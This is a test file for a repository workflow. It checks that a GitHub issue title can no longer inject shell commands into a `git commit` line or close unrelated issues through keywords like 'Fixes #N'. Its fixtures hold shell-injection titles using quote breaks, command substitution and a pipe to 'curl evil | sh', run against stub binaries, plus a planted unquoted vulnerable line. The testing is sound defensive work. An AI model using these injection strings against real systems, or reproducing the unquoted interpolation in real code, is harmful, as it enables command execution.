/**
 * Covers AC-1, AC-2, AC-3, AC-5, AC-6 (#696), and #706's removal of the
 * second composer.
 * Covers SC-2119, SC-2120, SC-2121, SC-2122 (HARNESS-STANDARD.md).
 *
 * `workflows/ship.js` composed the COMMIT phase's command as
 *
 *     git commit -m "fix(#${ISSUE}): ${goalData.issueTitle}"
 *
 * with the GitHub issue title interpolated UNQUOTED into a double-quoted
 * shell string, two lines under the prompt's own instruction "Run these in
 * order, exactly as written". `shellQuote` was declared in the same file and
 * applied at six other sites, including the wave commit one function away.
 *
 * Measured before the fix: a title of `x" ; echo … ; : "` composes to a line
 * `bash -n` accepts and which parses as three commands, not one.
 *
 * Two consequences from the one interpolation, and they need different
 * assertions:
 *
 *   - COMMAND EXECUTION. An issue title is writable by anyone who can open an
 *     issue; the only gate is an operator choosing to ship that issue.
 *   - A CLOSING KEYWORD. A title containing `Fixes #N` closes issue N on
 *     merge. This already happened by a different route on 2026-10-19:
 *     `cfc1415d` quoted ``Fixes #644`` as a SAMPLE INPUT inside a backtick
 *     code span and GitHub closed #644 three seconds after the merge.
 *     Backticks are not an escape.
 *
 * WHY THIS FILE EXECUTES RATHER THAN GREPS. A source-text assertion that
 * `shellQuote(` appears on the line cannot tell a correct application from
 * `shellQuote(title) + '"'`, and it is satisfied by the identifier appearing
 * in a comment. So the composition is extracted from ship.js and RUN, with a
 * stub `git` on PATH recording argv — the property is "exactly one command
 * ran, and its message is the title verbatim", which is not expressible as a
 * substring check.
 *
 * ONE DECIDER: `shellQuote` and the commit line are both lifted out of
 * `workflows/ship.js` itself and evaluated. Re-implementing either here would
 * be two deciders that agree, and a mutation of ship.js's copy would leave
 * this file green (`.claude/rules/checks-must-be-able-to-fail.md`, fourth
 * shape).
 *
 * ## What #706 changed about this file, and why the cases stayed
 *
 * #696's fix left the title in the prompt, quoted. #706 took it out: the
 * subject is composed by `scripts/github-op.ts commit-subject` from the API
 * into a file, and the agent runs `git commit -F <quoted path>`. The title
 * crosses neither a shell nor the agent's context.
 *
 * So the line under test changed shape, and the fixtures did not. Every
 * hostile title below is still composed — through `lib/commit-subject.ts`,
 * which is now the only composer in the tree — written to the file ship.js's
 * own path expression names, and run through a real shell against a stub
 * `git`. The claim is simply stronger than it was: not "the quoting holds"
 * but "there is no quoting for a title to defeat, because the title is not
 * on the command line at all", and the message git received is read back out
 * of the file to prove it arrived whole.
 *
 * `workflows/ship.js`'s inline copy of the subject builder is gone with the
 * call it existed for, so #696's parity case has nothing left to compare.
 * What replaces it is a case asserting the copy has not come back — see
 * AC-6 — and that is the honest successor: a comparator over a second copy
 * is worse than not having the second copy.
 */

import { describe, expect, test, beforeAll } from "bun:test";
import { execFileSync } from "node:child_process";
import { mkdtempSync, writeFileSync, readFileSync, chmodSync, rmSync, existsSync } from "node:fs";
import { join } from "node:path";
import { tmpdir } from "node:os";

import { structuralCut } from "../lib/source-slice";
import { commitSubject } from "../lib/commit-subject";
import { closingReferences } from "../scripts/check-state-record-closes";

const SHIP = join(import.meta.dir, "..", "workflows", "ship.js");
const shipSource = readFileSync(SHIP, "utf8");

/** ship.js's shell quoter, lifted from ship.js and evaluated. */
let shellQuote: (w: unknown) => string;
/** ship.js's own COMMIT-phase commit line, for a given work directory. */
let commitLine: (workDir: string) => string;
/** The path that line reads the subject out of, for the same work directory. */
let subjectPath: (workDir: string) => string;

beforeAll(() => {
  // `structuralCut` refuses rather than returning a short cut or the whole
  // document: an anchor appearing 0 or 2 times throws, and so does an empty
  // region. That is the loud abort a mutant builder needs, so there is no
  // length assertion here — a missing binding cannot reach the cases
  // (`.claude/rules/checks-must-be-able-to-fail.md`, "For a script whose job
  // is to exit non-zero").
  const quoteSrc = structuralCut(shipSource, "function shellQuote(", { balanced: "{" });

  // `new Function` over this repository's own `workflows/ship.js`, which is
  // the only way to make ship.js the single decider — nothing untrusted is
  // interpolated, and the alternative is re-implementing the quoter here and
  // testing the copy (fourth shape: two deciders that agree).
  shellQuote = new Function(`${quoteSrc}\nreturn shellQuote`)() as typeof shellQuote;

  // The COMMIT phase's own line, taken out of the prompt it lives in. Writing
  // `git commit -F ${shellQuote(commitSubjectPath)}` here instead would test a
  // composition this file invented: ship.js could drop the `shellQuote(`
  // tomorrow and every case below would stay green, which is precisely the
  // defect #696 was (#500, "a fixture that reached the assertion without the
  // feature"). `git commit` appears four times in ship.js, so the region is
  // cut first and the line found inside it.
  //
  // **#706 changed the shape of this line and that is the subject now.** It
  // used to be `git commit -m <the quoted issue title>`: safe against a
  // shell since #696, and still handing the title to the AGENT reading the
  // prompt. It is now `git commit -F <a quoted path>`, and the title is
  // composed into that file by `scripts/github-op.ts commit-subject`. So the
  // cases below assert the stronger property — the title is not in the
  // command at all, and no title can change what the command does.
  const commitBlock = structuralCut(
    shipSource,
    "Do NOT run tests — the test suite was already validated.",
    { endAnchor: "2. Get branch info:" },
  );
  // The `-C <dir>` is optional in the pattern and dropped from the
  // composition below: #1056 named the repository on the command rather than
  // reaching it with a top-level `cd`, and which directory git runs in is not
  // what this file measures. The captured group — the PATH EXPRESSION — is,
  // and it is still taken out of ship.js rather than written here.
  const found = commitBlock.match(/^\s*git (?:-C \S+ )?commit -F (.+)$/m);
  if (!found) throw new Error("the COMMIT phase's `git commit -F` line is not in the cut");
  const [, pathExpr] = found;

  // Wrapped back into a template literal so the `${…}` is evaluated by the
  // same rules ship.js evaluates it under, with ship.js's own quoter passed
  // in. Nothing is re-implemented; the only thing this file supplies is the
  // work directory the path is built from.
  const compose = new Function(
    "shellQuote",
    "commitSubjectPath",
    `return \`git commit -F ${pathExpr}\``,
  ) as (q: unknown, p: string) => string;

  // The path comes out of ship.js too. Spelling `${workDir}/commit-subject.txt`
  // here would be a second decider for where the subject lives: ship.js could
  // move the file and every case below would still write to the old place and
  // pass, having run `git commit -F` on a file this test created.
  const pathSrc = structuralCut(shipSource, "const commitSubjectPath =", { endAnchor: "\n" });
  const composePath = new Function("WORK_DIR", `${pathSrc}\nreturn commitSubjectPath`) as (
    w: string,
  ) => string;
  subjectPath = (workDir: string) => composePath(workDir);
  commitLine = (workDir: string) => compose(shellQuote, subjectPath(workDir));
});

/**
 * Run `git commit -m <quoted>` through a real shell with a stub `git`, and
 * report every invocation's argv.
 *
 * The stub is the whole instrument: a title that breaks out of the quoting
 * produces a SECOND invocation, or an invocation of something else entirely,
 * and either is visible here and invisible to a substring check.
 */
function runCommitLine(line: string | ((dir: string) => string), plant?: (dir: string) => void): {
  calls: string[][];
  extra: string;
  /** The subject file's contents as git would have read them, or null. */
  subject: string | null;
} {
  const dir = mkdtempSync(join(tmpdir(), "commit-quote-"));
  try {
    plant?.(dir);
    const log = join(dir, "argv.log");
    const marker = join(dir, "injected.log");
    const bin = join(dir, "bin");
    execFileSync("mkdir", ["-p", bin]);

    // Records argv, one JSON array per line.
    writeFileSync(
      join(bin, "git"),
      `#!/bin/sh\nprintf '%s\\n' "$(node -e 'console.log(JSON.stringify(process.argv.slice(1)))' "$@")" >> ${JSON.stringify(log)}\n`,
      { mode: 0o755 },
    );
    // Anything the injection reaches for leaves a trace rather than running.
    for (const name of ["echo_injected", "curl", "sh_marker"]) {
      writeFileSync(join(bin, name), `#!/bin/sh\necho "$@" >> ${JSON.stringify(marker)}\n`, {
        mode: 0o755,
      });
    }
    chmodSync(join(bin, "git"), 0o755);

    execFileSync("bash", ["-c", typeof line === "function" ? line(dir) : line], {
      env: { ...process.env, PATH: `${bin}:${process.env.PATH}` },
      cwd: dir,
      stdio: "pipe",
    });

    const calls = existsSync(log)
      ? readFileSync(log, "utf8").trim().split("\n").filter(Boolean).map(l => JSON.parse(l))
      : [];
    const extra = existsSync(marker) ? readFileSync(marker, "utf8") : "";
    const planted = subjectPath(dir);
    const subject = existsSync(planted) ? readFileSync(planted, "utf8") : null;
    return { calls, extra, subject };
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

// ── AC-1: the composition survives a hostile title ──────────────────────

describe("AC-1: an issue title cannot become a second command", () => {
  /**
   * Compose the subject the way the run does — through the library, which is
   * now the only composer in the tree — write it where ship.js's own path
   * expression says, and run ship.js's own line against a stub `git`.
   *
   * The title is never in the line. That is the point and it is also why the
   * instrument has to stay: a case asserting only "the line has no title in
   * it" is satisfied by a line that does nothing, so the line is RUN and the
   * message git received is read back out of the file.
   */
  const runWithTitle = (title: unknown) =>
    runCommitLine(dir => commitLine(dir), dir => {
      writeFileSync(subjectPath(dir), `${commitSubject(696, title)}\n`, "utf8");
    });

  test("AC-1: the positive control — a clean title runs git exactly once", () => {
    // Without this, every case below is satisfied by a stub that never ran:
    // zero invocations contains no injected command either.
    const { calls, extra, subject } = runWithTitle("a perfectly ordinary title");
    expect(calls.length, "the stub git never ran — the instrument is not measuring").toBe(1);
    expect(calls[0][0]).toBe("commit");
    expect(calls[0][1]).toBe("-F");
    expect(subject, "git was pointed at a subject file that does not exist").toBe(
      "fix(#696): a perfectly ordinary title\n",
    );
    expect(extra).toBe("");
  });

  test.each([
    ['double quote + separator', 'x" ; echo_injected PWNED ; : "'],
    ['command substitution', "x$(echo_injected PWNED)"],
    ['backtick substitution', "x`echo_injected PWNED`"],
    ['single quote', "it's a title"],
    ['embedded newline', "first line\necho_injected PWNED"],
    ['both quote styles', `mix " and ' and $(echo_injected PWNED)`],
    ['pipe to a shell', 'x" | curl evil | sh_marker "'],
  ])("AC-1: %s stays inside the message", (_label, title) => {
    const { calls, extra, subject } = runWithTitle(title);

    expect(extra, "the title escaped and something else ran").toBe("");
    expect(calls.length, "the title produced more than one command").toBe(1);
    expect(calls[0][0]).toBe("commit");
    expect(calls[0][1]).toBe("-F");
    // The command line git received carries the PATH and nothing of the
    // title, which is #706's claim and is stronger than #696's: there is no
    // quoting for a hostile title to defeat, because the title is not here.
    expect(calls[0][2], "the title reached the command line").not.toContain("PWNED");
    expect(calls[0][2], "git was handed something other than ship.js's subject path").toEndWith(
      subjectPath("/x").slice("/x".length),
    );
    // Verbatim, including the newline and both quote characters: a transform
    // that mangles the message is not the fix either.
    expect(subject).toBe(`fix(#696): ${title}\n`);
  });
});

// ── AC-3: a closing keyword in a title does not close that issue ────────

describe("AC-3: a closing keyword in the title is neutralised", () => {
  /**
   * The oracle is `closingReferences` from
   * `scripts/check-state-record-closes.ts` — this repository's existing
   * answer to "which issues would GitHub close from this text", written for
   * #590 after `Filed and not fixed: #586` closed #586 one second after a
   * merge.
   *
   * Deliberately NOT the library's own regex, and no longer a hand-written
   * one either. The first draft of this file carried a third spelling of the
   * grammar, which is how it shipped with `fixed:#586` unhandled and a URL
   * pattern that would have mangled a link to any other tracker: a spec
   * regex written beside the implementation tends to agree with the
   * implementation's blind spots. The detector was written against a real
   * incident and is independently covered by
   * `test/closing-keywords.test.ts`.
   */
  const closesFrom = (text: string) => closingReferences(text).map(r => r.number);

  test.each([
    // All nine keywords GitHub documents, each in a plausible title.
    "close #1",
    "Closes #2 at last",
    "this closed #3",
    "fix #4 while we are here",
    "Fixes #500",
    "fixed #6, finally",
    "resolve #7",
    "Resolves #8 and #9",
    "Resolved #10 at last",
    // Casing and the colon form.
    "CLOSE #31",
    "Fixes: #632",
    // The keyword at the end of a line, with the reference on the next.
    "wave 2\nfixes #44",
    // The three reference forms beyond `#N`. A fix that handles only `#N`
    // leaves these closing issues, which is what the first draft did —
    // found by the automated review of the first commit, not by this file.
    "closes GH-77",
    "fixes hornjason/pai-harness#88",
    "resolves https://github.com/hornjason/pai-harness/issues/99",
    // The colon with no space after it. This is the exact form that closed
    // #586 — `Filed and not fixed: #586` — and the first draft of the
    // separator, `\s*:?\s+`, required whitespace and so missed it.
    "fixed:#586",
    "a PR link: fixes https://github.com/hornjason/pai-harness/pull/55",
  ])("AC-3: %j closes nothing but the run's own issue", (title) => {
    // The oracle decides, not a regex written next to the implementation:
    // after the transform, the ONLY issue GitHub would close from this
    // subject is 696, which is the one the run means.
    expect(closesFrom(commitSubject(696, title))).toEqual([]);
    expect(commitSubject(696, title), "the digits were eaten, not the adjacency")
      .toMatch(/\d/);
  });

  test("AC-3: the fixtures really do trip the detector before the transform", () => {
    // Vacuity control, and the one that caught the real gaps. If the oracle
    // saw nothing in a fixture, that fixture's case above would pass over a
    // transform that does nothing at all.
    const corpus: [string, number][] = [
      ["Fixes #500", 500],
      ["CLOSE #31", 31],
      ["Fixes: #632", 632],
      ["wave 2\nfixes #44", 44],
      ["closes GH-77", 77],
      ["fixes hornjason/pai-harness#88", 88],
      ["resolves https://github.com/hornjason/pai-harness/issues/99", 99],
      ["fixed:#586", 586],
      ["a PR link: fixes https://github.com/hornjason/pai-harness/pull/55", 55],
    ];
    for (const [title, number] of corpus) {
      expect(closesFrom(title), `${title} is not a closing reference — the fixture is inert`)
        .toContain(number);
    }
  });

  test("AC-3: the detector and the neutraliser agree about what is NOT a reference", () => {
    // The other direction, and the one that stops the neutraliser buying
    // green by mangling everything. Text the oracle reads as closing nothing
    // must come through the transform completely unchanged — otherwise a
    // `replace(/.*/, '')` would pass every case above.
    for (const title of [
      "#630 Phase 2: the three credentialed modes",
      "prefix fixtures #5 suffix",
      "closing #586 is the next job",
      "fixed that for itself in #510",
      "resolves the flake, see #12",
      "an ordinary title",
    ]) {
      expect(closesFrom(title), `the oracle reads ${title} as a close`).toEqual([]);
      expect(commitSubject(696, title), `${title} was altered and should not have been`)
        .toBe(`fix(#696): ${title}`);
    }
  });

  test("AC-3: the run's OWN reference is untouched — it is the one that should close", () => {
    // `fix(#696):` is the prefix this workflow writes deliberately. Neutralising
    // it would break the link between every ship commit and its issue.
    expect(commitSubject(696, "an ordinary title")).toStartWith("fix(#696): ");
  });

  test("AC-3: a bare issue reference with no keyword is left alone", () => {
    // `#630 Phase 2: …` is a real title in this repo. A bare `#N` does not
    // close anything, so rewriting it would be damage with no benefit.
    const subject = commitSubject(631, "#630 Phase 2: the three credentialed modes");
    expect(subject).toContain("#630 Phase 2");
  });

  test("AC-3: the transform is total over the things GitHub hands back", () => {
    for (const v of [null, undefined, 42, ""]) {
      expect(() => commitSubject(696, v as never)).not.toThrow();
    }
  });
});

// ── AC-6: ship.js's forced copy and the library agree ───────────────────

describe("AC-6: one position composes a commit subject, and ship.js is not one", () => {
  /**
   * `lib/commit-subject.ts` owns this and `scripts/github-op.ts` imports it,
   * from two commands — `pr-upsert --title-from-issue` and, since #706,
   * `commit-subject`.
   *
   * **`workflows/ship.js` used to carry an inline copy** because a workflow
   * script cannot import (#69), and #696 shipped a behavioural parity case
   * comparing the two over sixteen fixtures. #706 took the issue title out
   * of the COMMIT prompt altogether, which left that copy with no caller, so
   * it was deleted with the call it existed for. There is nothing left to
   * compare: one composer, reached from every position.
   *
   * That is why the parity case is gone and the scan below is not. Two
   * copies that nothing compares is #621 exactly — three files named the
   * project's test command, nothing compared them, and every ship run
   * reported `SHIP_PASSED_SUITE_FAILED`. The scan is what keeps a second
   * copy from reappearing, and it reads `workflows/ship.js` along with the
   * other two precisely because ship.js is where one came from.
   */
  /**
   * One fixture per dimension the two copies could disagree on, which is a
   * stricter requirement than "a plausible set of titles" and is the thing
   * this list got wrong first time round.
   *
   * Measured: with the separator mutated back to the first draft's
   * `\s*:?\s+` in ship.js's copy only, this case stayed GREEN at eleven
   * fixtures and the whole battery row came back 1 where 2 was predicted.
   * The corpus had no colon-with-no-space in it, so the one dimension the
   * two spellings differed on was outside what the comparison could reach —
   * a parity case is only as wide as its corpus, and nothing but the count
   * said so.
   */
  const FIXTURES = [
    "an ordinary title",
    "Fixes #500", // keyword + bare reference
    "Fixes: #632", // colon, with a space
    "fixed:#586", // colon, NO space — the #586 form, and row I's dimension
    "closes   #7", // more than one space
    "closes GH-77", // the GH- form
    "fixes hornjason/pai-harness#88", // owner/repo
    "resolves https://github.com/hornjason/pai-harness/issues/99", // issue URL
    "fixes https://github.com/hornjason/pai-harness/pull/55", // pull URL
    "closing #586 is next", // the \b after the stem
    "#630 Phase 2: the three credentialed modes", // a reference, no keyword
    "wave 2\nfixes #44", // across a newline
    'x" ; echo PWNED ; : "',
    "it's a title",
    "prefix fixtures #5 suffix", // the \b before the stem
    "",
  ];

  test("AC-6: ship.js composes no commit subject and carries no copy of the grammar", () => {
    // What the parity case became. #696's copy was compared because it had
    // to exist; #706 removed the caller, so the honest claim is that it is
    // gone and nothing has put it back. Both halves are asserted: the
    // builder, and the regex it closed over — a copy of the grammar with no
    // function around it is the same second decider one refactor later.
    expect(shipSource, "ship.js composes a commit subject again").not.toContain(
      "function shipCommitSubject(",
    );
    expect(shipSource, "ship.js carries a copy of the closing-reference grammar again").not.toContain(
      "CLOSING_REFERENCE",
    );
    expect(shipSource, "the deleted block's markers are still in ship.js").not.toContain(
      "COMMIT-SUBJECT-START",
    );

    // And the control, because three `not.toContain`s over a 400,000-character
    // file are three assertions that would hold over an empty string: the
    // file really is ship.js, and it really does still run the commit step.
    expect(shipSource, "the source read here is not ship.js").toContain("function shellQuote(");
    expect(shipSource).toContain("commit -F ");
  });

  test("AC-6: the comparison is not vacuous — the fixtures reach the transform", () => {
    // Both sides returning the input unchanged would agree perfectly. At
    // least one fixture has to be something the transform CHANGES, or this
    // whole describe is two identity functions agreeing.
    const changed = FIXTURES.filter(t => commitSubject(696, t) !== `fix(#696): ${t}`);
    expect(changed.length, "no fixture is altered by the transform").toBeGreaterThan(3);
  });

  /** Every file in this tree that composes a `fix(#N): …` commit subject. */
  const SCANNED = ["scripts/github-op.ts", "lib/commit-subject.ts", "workflows/ship.js"];

  /**
   * The 1-indexed lines composing a subject WITHOUT the neutraliser.
   *
   * Line-based rather than a windowed slice, because both real sites are one
   * line and `test/no-fixed-window-slices.test.ts` holds the population of
   * numeric slices at zero (#664). The two accepted spellings are the owning
   * binding and the inline copy's call to its own regex — not an allowlist of
   * sites, which is the thing that becomes evidence it was reviewed; the
   * parity case above is what makes the second spelling equivalent to the
   * first rather than merely tolerated.
   */
  const handComposed = (src: string): number[] =>
    src
      .split("\n")
      .map((line, i) => ({ line, n: i + 1 }))
      .filter(({ line }) => /`fix\(#\$\{[^}]*\}\): \$\{/.test(line))
      .filter(({ line }) => !/neutraliseClosingKeywords|\.replace\(CLOSING_REFERENCE/.test(line))
      .map(({ n }) => n);

  test("AC-6: no position composes a commit subject by hand", () => {
    // The third position, and the one neither AC-1 nor AC-3 can see:
    // `scripts/github-op.ts --title-from-issue` built `fix(#N): <title>` with
    // a template literal. Keeping the title off a command line stops a SHELL
    // reading it and does nothing about GITHUB reading it — that PR title
    // becomes the squash-merge commit subject, which is the position that
    // closed #644. A behavioural case would need the API, so this is a
    // population scan over the source, which is what it is: the composition
    // must go through the one binding, everywhere.
    const offenders = SCANNED.flatMap(p =>
      handComposed(readFileSync(join(import.meta.dir, "..", p), "utf8")).map(n => `${p}:${n}`),
    );
    expect(offenders, `a hand-composed commit subject in: ${offenders.join(", ")}`).toEqual([]);
  });

  test("AC-6: that scan can see a hand-composed subject", () => {
    // Zero is also what a scan pointed at the wrong thing reports, so both
    // directions are exercised against the same binding: the genuinely
    // pre-#696 line out of github-op.ts, and the two live compositions.
    expect(handComposed("  title = `fix(#${n}): ${issue.title}`;"), "the pre-#696 line")
      .toEqual([1]);
    expect(handComposed("return `fix(#${issue}): ${neutraliseClosingKeywords(title)}`")).toEqual([]);
    expect(
      handComposed("return `fix(#${issue}): ${String(title ?? '').replace(CLOSING_REFERENCE, '$1$2$3 ')}`"),
    ).toEqual([]);
  });

  test("AC-6: the library refuses an issue number it cannot compose a reference from", () => {
    // `fix(#undefined):` is a subject, and it is one nobody can trace back.
    for (const bad of [0, -1, 1.5, NaN, undefined]) {
      expect(() => commitSubject(bad as never, "t")).toThrow(TypeError);
    }
  });
});

// ── AC-2: the population of unquoted interpolations is zero ─────────────

describe("AC-2: no shell command in ship.js interpolates untrusted text unquoted", () => {
  /**
   * Agent- and issue-supplied values, by the name they carry in ship.js.
   *
   * Deliberately NOT an exemption list of allowed sites — this is a list of
   * tainted SOURCES, and the assertion is that none of them reaches a shell
   * command without `shellQuote`. An exemption list naming permitted
   * violations becomes evidence they were reviewed
   * (`.claude/rules/exemption-list-self-reference.md` territory); a source
   * list grows only when a new untrusted input is added, which is the moment
   * someone should look.
   */
  const TAINTED = ["goalData.issueTitle", "goalData.issueGoal", "issueTitle"];

  test("AC-2: every tainted interpolation inside a shell command is quoted", () => {
    const offenders: string[] = [];
    shipSource.split("\n").forEach((line, i) => {
      if (!/\b(git|gh|bun|cd|echo|cat|ssh|curl)\b/.test(line)) return;
      for (const name of TAINTED) {
        if (!line.includes(`\${${name}}`)) continue;
        if (line.includes("shellQuote")) continue;
        offenders.push(`${i + 1}: ${line.trim()}`);
      }
    });
    expect(offenders, `unquoted tainted interpolation into a shell command:\n${offenders.join("\n")}`)
      .toEqual([]);
  });

  test("AC-2: the scan can see an offender — it is not matching nothing", () => {
    // The population is zero after the fix, and zero is what a scan that
    // looks at the wrong thing also reports. So plant one and watch it
    // register, against the same code path.
    const planted = `   git commit -m "fix(#\${ISSUE}): \${goalData.issueTitle}"`;
    const offenders: string[] = [];
    [planted].forEach((line, i) => {
      if (!/\b(git|gh|bun|cd|echo|cat|ssh|curl)\b/.test(line)) return;
      for (const name of TAINTED) {
        if (!line.includes(`\${${name}}`)) continue;
        if (line.includes("shellQuote")) continue;
        offenders.push(`${i + 1}: ${line.trim()}`);
      }
    });
    expect(offenders.length, "the scan cannot see the pre-#696 line").toBe(1);
  });
});

// ── AC-5: the cheapest wrong fix does not satisfy AC-1 ──────────────────

describe("AC-5: stripping quote characters is not the fix", () => {
  test("AC-5: the 5pm repair still executes a backtick and a $( ) title", () => {
    // What an operator sees is a double quote breaking the line, so the cheap
    // repair is to delete double quotes from the title and leave the rest.
    // Named per `.claude/rules/checks-must-be-able-to-fail.md`'s fifth shape.
    const cheapRepair = (title: string) =>
      `git commit -m "fix(#696): ${title.replace(/"/g, "")}"`;

    // It does stop the case that motivated the fix…
    const quoted = runCommitLine(cheapRepair('x" ; echo_injected PWNED ; : "'));
    expect(quoted.extra, "the cheap repair does not even stop the quote case").toBe("");

    // …and leaves these two running, inside the double quotes it kept.
    for (const title of ["x$(echo_injected PWNED)", "x`echo_injected PWNED`"]) {
      const { extra } = runCommitLine(cheapRepair(title));
      expect(
        extra,
        `the cheap repair was expected to leave ${title} executing — if this is empty the counterfactual is wrong, not the fix`,
      ).toContain("PWNED");
    }
  });
});
